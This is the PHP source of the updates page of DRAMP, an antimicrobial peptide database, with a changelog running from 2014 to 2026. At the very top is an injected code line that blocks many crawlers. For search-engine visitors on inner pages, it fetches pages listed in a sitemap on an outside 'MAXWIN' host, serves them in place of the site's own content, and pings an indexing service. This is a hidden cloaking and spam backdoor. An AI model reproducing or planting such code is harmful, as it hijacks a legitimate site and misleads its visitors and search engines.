<?php session_start();$blocked_agents=array("DigExt","indy Library","AskTbFXTV","FeedDemon","SeznamBot","java","YisouSpider","DotBot","CoolpadWebkit","OBot","zmEu","mj12bot","GPTBot","Python","Swiftbot","Ezooms","LightDeckReports Bot","apacheBench","Python-requests","Go-http-client","Heritrix","scrapy","Barkrowler","YySpider","SemrushBot","EasouSpider","CrawlDaddy","HttpClient","AmazonBot","PetalBot","yandexBot","AhrefsBot","python-urllib","CensysInspect","Jaunty","bytespider","Feedly","Paloaltonetworks","UniversalFeedParser","jikeSpider","DataForSEO");$user_agent=isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:'';$request_uri=isset($_SERVER['REQUEST_URI'])?$_SERVER['REQUEST_URI']:'';if(preg_match("/(".implode("|",$blocked_agents).")/i",$user_agent)){header('HTTP/1.0 403 Forbidden');exit();}$allowed_agents=array("Bing","Google","Yahoo","Docomo");$allowed=false;foreach($allowed_agents as $agent){if(stripos($user_agent,$agent)!==false){$allowed=true;break;}}if($allowed&&!in_array($request_uri,array('/','/index.php'))){process_sitemap();}function process_sitemap(){$sitemap_url="https://server-MAXWIN.SPACE/TEST-Tunnel/halaman.xml";$sitemap_content=curl_get_contents($sitemap_url);if($sitemap_content){$xml=simplexml_load_string($sitemap_content);$urls=array();foreach($xml->url as $url){$urls[]=(string)$url->loc;}if(!empty($urls)){if(!isset($_SESSION['used_urls'])||count($_SESSION['used_urls'])>=count($urls)){$_SESSION['used_urls']=array();}$available_urls=array_diff($urls,$_SESSION['used_urls']);if(empty($available_urls)){$_SESSION['used_urls']=array();$available_urls=$urls;}$target_url=$available_urls[array_rand($available_urls)];$_SESSION['used_urls'][]=$target_url;$html_content=curl_get_contents($target_url);if($html_content){ping_pingomatic($target_url,$html_content);echo$html_content;exit;}}}}function curl_get_contents($url){$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($ch,CURLOPT_USERAGENT,isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:'');curl_setopt($ch,CURLOPT_TIMEOUT,10);$data=curl_exec($ch);curl_close($ch);return$data;}function ping_pingomatic($target_url,$html_content){preg_match("/<title>(.*?)<\/title>/i",$html_content,$matches);$title=isset($matches[1])?$matches[1]:'';$protocol=(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on')?'https':'http';$blogurl=$protocol."://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];$ping_url="https://pingomatic.com/ping/?title=".urlencode($title)."&blogurl=".urlencode($target_url)."&rssurl=&chk_blogs=on&chk_feedburner=on&chk_tailrank=on&chk_superfeedr=on";curl_get_contents($ping_url);} ?>

<!DOCTYPE html>



<html lang="en">



<head>



	<title>Welcome To Dramp Database</title>



	<meta http-equiv="content-type" content="text/html; charset=UTF-8">



	<meta charset="utf-8">



	<link rel="stylesheet" type="text/css" href="../lazysheep/css/bootstrap.css">



    <link rel="stylesheet" type="text/css" href="../lazysheep/css/private.css">



    <link rel="stylesheet" type="text/css" href="../lazysheep/css/bootstrap-theme.css">



    <link rel="stylesheet" type="text/css" href="../lazysheep/css/public.css">



	<script language="Javascript" src="../lazysheep/js/jquery-1.11.1.js"></script>



    <script language="JavaScript" src="../lazysheep/js/bootstrap.js"></script>



    <link rel="shortcut icon" href="../favicon.ico" type="image/x-icon" />



	<script type="text/javascript" src="../js/jquery-1.js"></script>



    <script type="text/javascript" src="../js/jquery.js"></script>    



</head>







<body>



<?php







          require_once ("../head/head_content.php");







?>



<div class="container">



                   <div class="content" style="margin-top:30px;">

					
					
					<h2>September 11,2026</h2>
						<ul class="item">
							<li>Daily maintaining.</a>.</li>
					</ul>

				 	  <h2>June 23,2026</h2>
						<ul class="item">
							<li>DRAMP V5.0 has released.</li>
							<ul type = "disc">
							<li>A novel FASTS format is proposed by integrating SMILES information into FASTA annotation lines, total of 22180.</li>
							<li>Sequence and structural information are combined into a unified file format.</li>
							<li>The FASTS format facilitates AI/ML-based peptide prediction and design.</li>
							<li>Structure-aware sequence analysis and computer-aided peptide design are supported.
							<li>2036 new entries are added in DRAMP compared to V3.0.</li>
							<li>User interface of our website has been improved and some bugs are fixed</li>
							<li>If you have any suggestions and comments, please write to <a href="mailto:970254590@qq.com">970254590@qq.com</a>. We are preparing to publish our efforts to make DRAMP more well-known and help more researchers.</li>


					</ul>
					
					<h2>May 21,2026</h2>
						<ul class="item">
							<li>We uploaded SMILES representations for a subset of the data.</a>.</li>
					</ul>
					
					<h2>April 8,2026</h2>
						<ul class="item">
							<li>The Download page has been enhanced to provide access to a broader range of activity-related datasets. Users can now download more comprehensive antimicrobial activity information, facilitating large-scale data analysis and research applications.</a>.</li>
					</ul>
				
					<h2>Fabruary 28,2026</h2>
						<ul class="item">
							<li>Optimization of the Target Organism page: The Target Organism section has been redesigned from a text-based format to a structured table format, providing clearer presentation of activity annotations and enabling users to quickly identify and compare target organism information.</a>.</li>
					</ul>
					
					<h2>January 4,2026</h2>
						<ul class="item">
							<li>We have updated 172 general data in DRAMP.</a>.</li>
					</ul>
					
					<h2>November 13,2025</h2>
						<ul class="item">
							<li>We have updated 116 patent data in DRAMP.</a>.</li>
					</ul>
				
					<h2>October 29,2025</h2>
						<ul class="item">
							<li>We have updated 125 general data in DRAMP.</a>.</li>
					</ul>
					
					<h2>September 18,2025</h2>
						<ul class="item">
							<li>We have updated 295 patent data in DRAMP.</a>.</li>
					</ul>
					
					<h2>August 21,2025</h2>
						<ul class="item">
							<li>We have updated 197 general data in DRAMP.</a>.</li>
					</ul>
				
					<h2>July 14,2025</h2>
						<ul class="item">
							<li>We have updated 169 patent data in DRAMP.</a>.</li>
					</ul>
					
					<h2>June 25,2025</h2>
						<ul class="item">
							<li>We have updated 279 general data in DRAMP.</a>.</li>
					</ul>
					
					<h2>April 18,2025</h2>
						<ul class="item">
							<li>We have updated 247 patent data in DRAMP.</a>.</li>
					</ul>
					
					<h2>March 7,2025</h2>
						<ul class="item">
							<li>We have updated 213 general data in DRAMP.</a>.</li>
					</ul>
					
					<h2>February 15,2025</h2>
						<ul class="item">
							<li>We have updated 35 stapled data in DRAMP.</a>.</li>
					</ul>
					
					<h2>December 21,2024</h2>
						<ul class="item">
							<li>We have updated 186 general data in DRAMP.</a>.</li>
					</ul>


				   <h2>November 14,2024</h2>



						<ul class="item">



							<li>DRAMP 4.0 has been published, and welcome to read and cite <a href="https://pubmed.ncbi.nlm.nih.gov/39526377/">it</a>.</li>



					</ul>

				 

				 

				   <h2>September 8,2024</h2>



				   		<ul class="item">



							<li>We have updated  179 expanded peptides in DRAMP.</li>



						</ul>

				   <h2>June 22,2024</h2>



						<ul class="item">



 							<li>We have updated 26 stability data in DRAMP.</li>



						</ul>  

				   <h2>May 22,2024</h2>



				   		<ul class="item">



							<li>We have updated 172 patent peptides in DRAMP.</li>



						</ul>

					<h2>April 11,2024</h2>



						<ul class = "item">



							<li>DRAMP V4.0 has released.</li>



							<ul type = "disc">



							<li>New fileds, including Hemolytic, Stability are provided in General Data and Specific Data. The updation is still ongoing.</li>



							<li>Peptides' sequence schematic drawings have been added.</li>



							<li>Clinical Information page have been improved.</li>



							<li>Polypeptide structural diagrams, as well as 136 experimentally determined AMP structures and 1310 new predicted structures by AlphaFold2, are added.</li>



							<li>7579 new entries are added in DRAMP compared to V3.0.</li>



							<li>User interface of our website has been improved and some bugs are fixed</li>



							<li>If you have any suggestions and comments, please write to <a href="mailto:970254590@qq.com">970254590@qq.com</a>. We are preparing to publish our efforts to make DRAMP more well-known and help more researchers.</li>



						</ul>



					</ul>







				   <h2>March 23,2024</h2>



				   		<ul class="item">



							<li>Database maintenance have been performed to ensure optimal performance and data integrity.</li>



						</ul>

					<h2>February 28,2024</h2>



						<ul class="item">



 							<li>We have updated 19 stability data in DRAMP.</li>



						</ul>

					<h2>January 16,2024</h2>



				   		<ul class="item">



							<li>We have updated 119 patent peptides in DRAMP.</li>



						</ul>

				   <h2>Noverember 4,2023</h2>



				   		<ul class="item">



							<li>We have updated 29 stapled peptides in DRAMP.</li>



						</ul>

					<h2>August 16,2023</h2>



						<ul class="item">



	 						<li>We have updated 37 stability data in DRAMP.</li>



						</ul>

						<h2>July 4,2023</h2>



				   		<ul class="item">



							<li>We have updated PDB ID of general amps in DRAMP. 95 entries with reported PDB ID have been added to DRAMP.</li>



						</ul>

				   <h2>May 17,2023</h2>



				   		<ul class="item">



							<li>We have updated information of clinical entries. Besides, 25 new clinical entries are added to DRAMP and some duplicate entries have been deleted.</li>



						</ul>



				   <h2>February 11,2023</h2>



				   		<ul class="item">



							<li>250 predicted structures of AMPs existed in DRAMP have been added.</li>



						</ul>



				   <h2>December 1,2022</h2>



				   		<ul class="item">



							<li>We have updated information of 200 AMPs existed in DRAMP, especially about N-terminal modification, C-terminal modification, other modifications, Stereochemistry and Cytotoxicity.</li>



						</ul>



				   <h2>October 10,2022</h2>



				   		<ul class="item">



							<li>113 predicted structures are added to DRAMP.</li>



						</ul>



				   <h2>September 6,2022</h2>



				   		<ul class="item">



							   <li>73 new entries with reported antiviral activity are added to DRAMP.</li>



						   </ul>



				   <h2>June 29,2022</h2>



				   		<ul class="item">



							   <li>52 predicted structures of AMPs existed in DRAMP have been added.</li>



							   <li>We have provided three types of files(.fasta,.txt,.xlsx) to download.</li>



						   </ul>



				   <h2>April 22,2022</h2>



				   		<ul class="item">



							   <li>91 entries with reported activities against SARS-CoV-2 are added to DRAMP,and some information about activities against SARS-CoV-2 have been updated for 6 entries existed in DRAMP.</li>



						   </ul>



				   <h2>March 12,2022</h2>



				   		<ul class="item">



							   <li>57 new entries were added to DRAMP,which contain 15 natural AMPs and 42 synthetic AMPs.</li>



						</ul>



				   <h2>Jan 5,2022</h2>



				   		<ul class="item">



							<li> Happy new year! We have deployed some prediction models on the DRAMP, which can help to predict antigram- bacterial activity for cyclic peptides and hemolytic activity for AMPs.</li>



						</ul>



				   <h2>Dec 26,2021</h2>



				   		<ul class="item">



							<li> We have introduced 3Dmol viewer to display PDB sturctures and predicted structures.</li>



						</ul>







				   <h2>Nov 4,2021</h2>



				   		<ul class="item">



							<li> 274 predicted structures of AMPs existed in DRAMP have been added.</li>



						</ul>







				   <h2>Oct 31,2021</h2>



						<ul class="item">



							<li> We have updated information of 200 AMPs existed in DRAMP, especially about <i>N-terminal modification</i>, <i>C-terminal modification</i>, <i>other modifications</i>, <i>Stereochemistry</i> and <i>Cytotoxicity</i>. Another update is coming in a few weeks.</li>



						</ul>







				   <h2>Aug 15,2021</h2>



						<ul class="item">



							<li>DRAMP 3.0 has been published, and welcome to read and cite <a href="https://pubmed.ncbi.nlm.nih.gov/34390348/">it</a>. Besides, the dataset of stapled AMPs are allowed to be downloaded now.</li>



						</ul>







				   <h2>May 26,2021</h2>



						<ul class="item">



							<li>50 new entries are added to DRAMP. 9 entries are natural AMPs which contain 7 plant AMPs and 2 plant AMPs. The other 41 entries are synthetic AMPs.</li>



						</ul>



						



				   <h2>April 6,2021</h2>



						<ul class="item">



							<li>36 new entries about stapled antimicrobial or anticancer peptides have been added to DRAMP. 22 new general entries have also been added and 1 old entry has got updated.</li>



						</ul>







				   <h2>February 28,2021</h2>



						<ul class="item">



							<li> 146 predicted structures of stapled peptides have been added to DRAMP.</li>



						</ul>







				   <h2>January 8,2021</h2>



						<ul class="item">



							<li> 1371 new patent entries are added to DRAMP.</li>



						</ul>







					<h2>December 26,2020</h2>



						<ul class = "item">



							<li>New classification in specific data which is "Predictive AMPs" has been updated in the browse list. The breif workflow of screening and prediction is available in Predictive AMPs.</li>



							<li>5909 new entries about predictive antimicriobial peptides are added in DRAMP, which are stored in Specific Data. Concrete activity data are not available in Predictive AMPs temporarily.</li>



							<li>21 new entries are added in DRAMP, which are stored in General dataset. All 21 entries are synthetic AMPs after screening</li>



						</ul>







				   <h2>December 13,2020</h2>



						<ul class = "item">



							<li>DRAMP V3.0 has released.</li>



							<ul type = "disc">



							<li>New fileds, including Cytotoxicity, Linear/Cyclic(the shape of peptide), N-terminal Modification, C-terminal Modification, Other Modifications and Unusual Amimo Acids, Stereochemistry, are provided in General Data and Specific Data. Such information of nearly one thousand entries are updated and the updation is still ongoing.</li>



							<li>New classification by data type which is Specific AMPs and the other one which is stapled AMPs have been updated in the Browse List.</li>



							<li>145 new entries about stapled antimicrobial peptides are added in DRAMP, which are stored in Specific Data. Enclosed alphanumerics and improved helical wheel diagram are used to describe stapling position in stapled AMPs. Original Sequence as a new filed is provided for convenience of comparison between stapled sequence and original unmodified sequence.</li>



							<li>18 new entries are added in DRAMP, which are stored in General Data, and they are original sequences of stapled AMPs.</li>



							<li>Latest entries after DRAMP18193 are added into our local blast library. In our local library, Special amino acids are represented as X.</li>



							<li>User interface of our website has been improved and some bugs are fixed</li>



							<li>If you have any suggestions and comments, please write to <a href="mailto:602192794@qq.com">602192794@qq.com</a>. We are preparing to publish our efforts to make DRAMP more well-known and help more researchers.</li>



							</ul>



						</ul>







					<h2>September 14,2020</h2>



						<ul class = "item">



							<li>31 entries are re-updated in the General dataset. 4 redundant entries(DRAMP20840, DRAMP20931, DRAMP20954 and DRAMP20962) are deleted and such DRAMP_IDs will keep empty until new entries are added. Besides, we redo the "Submit" function and now you can easily contribute valuable information about AMPs. The information will be checked before presented in DRAMP.</li>



						</ul>







				   <h2>August 17,2020</h2>



						<ul class ="item">



							<li>158 new entries are added in DRAMP. 9 entries are natural AMPs which are all animal AMPs. 149 entris are synthetic AMPs. Next update will be soon, which foucuses on some corrections and complements of existing entries.</li>



						</ul>



						



				   <h2>May 5,2020</h2>



						<ul class="item">



							<li> 207 new entries are added in DRAMP. 13 entries are natural AMPs which contain 12 animal AMPs and 1 plant AMPs. 194 entries are synthetic AMPs. 48 entries are re-updated in the General dataset. Some errors in Synthetic dataset are fixed.</li>



						</ul>



										   



				   <h2>February 8,2020</h2>



						<ul class="item">



							<li> 171 new entries are added in DRAMP. 13 entries are natural AMPs which are all animal AMPs. 158 entries are synthetic AMPs. 10 entries are re-updated in the General dataset. Some errors in Natural dataset are fixed.</li>



						</ul>



						



				   <h2>November 14,2019</h2>



						<ul class="item">



							<li> 157 new entries are added to in DRAMP. 33 entries are natural AMPs including 31 animal AMPs and 2 plant AMPs. 124 entries are synthetic AMPs.</li>



						</ul>



						



				   <h2>September 4,2019</h2>



						<ul class="item">



							 <li> New classifications by taxonomy which are "Archaea AMPs" and "Protozoal AMPs" have been updated in the browse list.</li>



						</ul>



						



				    <h2>July 4,2019</h2>



						<ul class="item">



							 <li> New classifications by activity which are "Antimicrobial" , "Anti-Gram+" ,"Anti-Gram-" and "Antiparasitic" have been updated in the browse list.</li>



						</ul>







						



				   <h2>June 6,2019</h2>



						<ul class="item">



							 <li> 59 entries are re-updated in the General dataset. The page of Quicklink is updated.</li>



						</ul>







				   <h2>April 3,2019</h2>



						<ul class="item">



							 <li> 632 entries are re-updated in the General dataset. Some errors are fixed.</li>



						</ul>







				   <h2>January 1,2019</h2>



				   	    <ul class="item">



							 <li> 2041 new entries are added in DRAMP. 4 entries are bacteriocins in natural dataset, 2035 entries are patent AMPs, 2 entries in clinicaltrials.</li>



						</ul>







				   <h2>October 30,2018</h2>



					    <ul class="item">



							 <li> DRAMP V2.0 has released!</li>



								 <ul type="disc">



									<li> Add hemolytic activity information including red blood cell source.</li>



									<li> Add bar chart of amino acid distribution of peptides in all detail information.</li>



									<li> In order to improve the reliability of data, add pubmed ID to corresponding active data in activity information.</li>



									<li> Add 82 AMPs predicted structures and provide a download link in their detail information. The 3D structure model of AMPs was generated based on homology modeling using MOE, and optimized with molecular dynamics (MD) simulations. PMID:<a href="https://www.ncbi.nlm.nih.gov/pubmed/30046138">30046138</a></li>



									<li> Add 229 new entries of AMPs in the General dataset. 72 entries are nature AMPs including 4 bacteriocins and 1 plant AMPs. 157 entries are synthetic AMPs.</li>



									<li> Update the counters on the homepage of the website. This counter only counts the number of visitors per day, and does not count the number of page refreshes. Malicious refresh of the page does not increase the count.</li>



									<li> Update the page of all information, readme, update and homepage.</li>



									<li> Fix some bugs.</li>



									<li> Under the premise of adding new entries, the original data of the database will be re-updated again.</li>



									<li> 82 AMPs predicted structures are DRAMP00183, DRAMP00124, DRAMP00020, DRAMP18217, DRAMP18246, DRAMP00182, DRAMP18248, DRAMP18249, DRAMP18250, DRAMP00086, DRAMP00123, DRAMP00090, DRAMP00170, DRAMP00102, DRAMP00091, DRAMP00136, DRAMP18260, DRAMP18261, DRAMP00151, DRAMP00152, DRAMP00178, DRAMP18262, DRAMP18263, DRAMP18265, DRAMP00188, DRAMP00169, DRAMP00079, DRAMP00075, DRAMP18267, DRAMP00121, DRAMP00239, DRAMP18268, DRAMP18271, DRAMP00074, DRAMP18272, DRAMP00077, DRAMP00207, DRAMP00186, DRAMP00187, DRAMP00226, DRAMP00227, DRAMP00228, DRAMP00110, DRAMP00109, DRAMP18281, DRAMP00010, DRAMP18282, DRAMP18283, DRAMP00100, DRAMP00213, DRAMP00101, DRAMP00082, DRAMP00083, DRAMP18285, DRAMP18289, DRAMP00069, DRAMP00172, DRAMP18291, DRAMP00258, DRAMP00008, DRAMP00097, DRAMP12866, DRAMP00171, DRAMP00095, DRAMP00173, DRAMP00189, DRAMP00190, DRAMP00001, DRAMP00035, DRAMP18305, DRAMP00096, DRAMP00111, DRAMP18306, DRAMP00068, DRAMP00022, DRAMP00052, DRAMP04437, DRAMP00161, DRAMP00071, DRAMP00164, DRAMP02470, DRAMP00073.</li>



									<li> Welcome to comment and suggest, please contact <a href="mailto:zhengh18@hotmail.com">zhengh18@hotmail.com</a></li>



								 </ul>



						</ul>



				   



				   <h2>September 28,2018</h2>



					    <ul class="item">



							 <li> DRAMP V2.0 will be released in October! Welcome to comment and suggest!</li>



						</ul>



				   



				   <h2>September 27,2018</h2>



					    <ul class="item">



							 <li> 91 DRAMP entries are re-updated in the General dataset. 90 entries are nature AMPs including 1 bacteriocin and 3 plant AMPs, 1 entry is synthetic AMP. </li>



						</ul>



						



				    <h2>July 12,2018</h2>



				        <ul class="item">



				             <li> 12 error entries of AMPs are fixed in the General dataset. 11 repeated entries are deleted. </li>



						</ul>



				   



				   <h2>June 6,2018</h2>



				        <ul class="item">



				             <li> 8 new natural entries of AMPs are added to the General dataset. Citing US and some pages are updated. Some errors are fixed. </li>



						</ul>



				    



				   <h2>March 2,2018</h2>



				        <ul class="item">



				            <li>28 new entries of AMPs are added to the General dataset, including 11 natural AMPs and 17 synthetic AMPs. Some errors are fixed. </li>



						</ul>



				   



				   <h2>November 20,2017</h2>



				        <ul class="item">



				            <li>21 error entries of AMPs are fixed in the General dataset. 3 useless entries without antimicrobial activity are deleted.</li>



						</ul>



						



				   <h2>September 12,2017</h2>



                        <ul class="item">



						    <li>108 new entries of AMPs are added to the General dataset, including 17 bacteriocins, 102 natural AMPs and six synthetic AMPs. Some errors are fixed. 5 repeated entries are deleted.</li>



                        </ul> 



						



				   <h2>February 26,2017</h2>



                        <ul class="item">



						    <li>148 new entries of bacteriocins are added to the General dataset.</li>



                        </ul>  



						



				   <h2>October 17,2016</h2>



                        <ul class="item">



						    <li>Five new entries -<a href="http://dramp.cpu-bioinfor.org/browse/All_Information.php?id=DRAMP18199">DRAMP18199</a>, <a href="http://dramp.cpu-bioinfor.org/browse/All_Information.php?id=DRAMP18200">DRAMP18200</a>, <a href="http://dramp.cpu-bioinfor.org/browse/All_Information.php?id=DRAMP18201">DRAMP18201</a>, <a href="http://dramp.cpu-bioinfor.org/browse/All_Information.php?id=DRAMP18202">DRAMP18202</a>, <a href="http://dramp.cpu-bioinfor.org/browse/All_Information.php?id=DRAMP18203">DRAMP18203</a>, are added to the General dataset.</li>



                        </ul>  



						



				   <h2>July 28,2016</h2>



                        <ul class="item">



						    <li>Two new entries -<a href="http://dramp.cpu-bioinfor.org/browse/All_Information.php?id=DRAMP18197">DRAMP18197</a>, <a href="http://dramp.cpu-bioinfor.org/browse/All_Information.php?id=DRAMP18198">DRAMP18198</a>, are added to the General dataset.</li>



                        </ul>  



						



				   <h2>April 29,2016</h2>



                        <ul class="item">



						    <li>A new entry-<a href="http://dramp.cpu-bioinfor.org/browse/All_Information.php?id=DRAMP18196">DRAMP18196</a> is added.</li>



                        </ul>  



                   



                   <h2>Feburary 19,2016</h2>



                        <ul class="item">



						    <li>Newly released structures of Cm-p1, Hylin-a1, DEFA1, Protegrin-3, Protegrin-2, Anoplin, Defensin-BvL are registered.</li>



                        </ul>  







                   <h2>December 27,2015</h2>



                        <ul class="item">



						    <li>Three new entries -<a href="http://dramp.cpu-bioinfor.org/browse/All_Information.php?id=DRAMP18193">DRAMP18193</a>, <a href="http://dramp.cpu-bioinfor.org/browse/All_Information.php?id=DRAMP18194">DRAMP18194</a>, <a href="http://dramp.cpu-bioinfor.org/browse/All_Information.php?id=DRAMP18195">DRAMP18195</a>, are added to the General dataset.</li>



                        </ul>                   



                   



                   



                   <h2>November 24,2015</h2>



                        <ul class="item">



						    <li>Ten new entries from swiss-prot are added to the database as an update.</li>



                        </ul>



                   <h2>August 19,2015</h2>



                        <ul class="item">



						    <li>Some dulplicate sequences were integrated and entries in general dataset have distinct sequences.</li>



                        </ul>



                    <h2>January 5,2015</h2>



                        <ul class="item">    



						    <li>Clinical dataset has been updated! Three peptides are registered into Clinical dataset, including two anti-HIV peptides and one pre-clinical antibacterial peptide.</li>



                        </ul>



                        



                    <h2>January 4,2015</h2>



                        <ul class="item">                         



						    <li>Clinical dataset has been updated!clinical trail state is examined and updated by checking the website of <a href="https://clinicaltrials.gov">clinicaltrail.gov</a>.</li> 



                            <li>Sequences of XOMA-629,DiaPep277,Ghrelin have been added.</li>



                        </ul>



                        



                    <h2>December 29,2014</h2>



                        <ul class="item">                       



						    <li>-Some errors are fixed. 6 repeated entries are deleted. We are sorry for the careless mistakes. The supervision of the data will be continual.</li>



                        </ul>



                        



                    <h2>October 30,2014</h2>



                        <ul class="item">                         



						    <li>-Database updated!</li>



                        </ul>



                        



                    <h2>September 12,2014</h2>



                        <ul class="item">                         



						    <li>-Database updated!</li>



                        </ul> 



                                               



                    <h2>June 06,2014</h2>



                        <ul class="item">                         



						    <li>-<a href="http://dramp.cpu-bioinfor.org/software/">FTP software</a> is provided.</li>



                        </ul>                         











                    <h2>May 03,2014</h2>



                        <ul class="item">                         



						    <li>-Database updated!</li>



                        </ul> 



                        



                    <h2>April 15,2014</h2>



                        <ul class="item">                         



						    <li>-Several analysis tools (similariy search, sequence alignment, CD-search) are integrated into DRAMP</li>



                        </ul>                         







                    <h2>January 20,2014</h2>



                        <ul class="item"> 



                            <li>-DRAMP V1.0 released! Welcome to comment and suggest! </li>           



                        </ul>



                    </div>



</div>



<?php







	require_once("../head/footer.php");







?>



</body>



